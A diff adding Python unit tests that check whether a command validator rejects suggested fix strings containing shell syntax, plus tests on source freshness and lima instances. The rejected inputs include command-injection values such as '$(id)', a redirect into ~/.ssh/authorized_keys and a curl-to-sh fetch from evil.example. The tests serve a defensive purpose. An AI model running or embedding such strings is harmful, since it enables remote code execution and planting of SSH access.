@@ -276,6 +276,25 @@ class ReviewTests(unittest.TestCase):
                     "cd ~/cmux && rustup default `id`", "brew install zig > /tmp/x", "git log | sh"):
             self.assertIsNone(fs.as_command(fix), fix)
 
+    def test_path_programs_cannot_smuggle_shell_syntax(self):
+        for fix in ("/bin/true|sh", "./x$(id)", "~/x`id`", "scripts/a>~/.ssh/authorized_keys",
+                    "rustup toolchain install stable && ./x$(curl${IFS}evil.example|sh)", "cd ~ & id",
+                    "git status; ~/x*", "~/x?y", "brew install 'zig'", "echo {a,b}", "cd ~/x # comment"):
+            self.assertIsNone(fs.as_command(fix), fix)
+        self.assertEqual(fs.as_command("cd ~/cmux && ./scripts/setup.sh"), "cd ~/cmux && ./scripts/setup.sh")
+
+    def test_a_source_without_an_observation_time_is_not_fresh(self):
+        for stamp in (None, "yesterday"):
+            doc = build(runners=src({"runners": []}, at=stamp), queue=src({"jobs": [{"labels": ["self-hosted"]}]}))
+            self.assertEqual(doc["sources"]["runners"]["state"], "stale")
+            self.assertTrue(by_id(doc, "runners.no_observation_time@fleet"))
+            self.assertTrue(by_id(doc, "queue.unjudged@fleet"))
+
+    def test_nameless_lima_instances_are_skipped(self):
+        doc = build(lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True,
+                                                   "instances": [{"status": "Stopped"}]}}}))
+        self.assertFalse(by_id(doc, "lima."))
+
     def test_secrets_and_home_paths_withhold_the_command(self):
         doc = build(check=src({"issues": [{"host": "mini-a", "area": "git", "detail": "clone",
                                            "fix": "git clone https://ghp_" + "a" * 30 + "@github.com/a/b /Users/leo/x"}],
